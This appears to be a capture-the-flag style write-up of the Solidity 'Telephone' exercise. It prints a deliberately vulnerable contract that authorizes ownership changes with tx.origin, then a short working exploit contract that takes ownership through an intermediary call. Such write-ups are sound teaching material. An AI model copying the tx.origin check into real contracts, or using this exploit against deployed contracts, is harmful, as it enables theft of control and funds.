## 4. Telephone

Goal for this exercise is:

- Claim ownership of the contract


<br/>

Here is the contract code:
~~~
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
~~~



Important was to notice use of `tx.origin`.

Plan is to write contract which interacts with `changeOwner()` function.

<br/>

Here is code for the exploit:
~~~
pragma solidity ^0.6.0;


interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneExploit {


    function claimOwner(address _telephoneContract) public {
        Telephone(_telephoneContract).changeOwner(msg.sender);
    
    }
}
~~~

<br/>

I deployed contract from Remix IDE and called `claimOwner()` function.
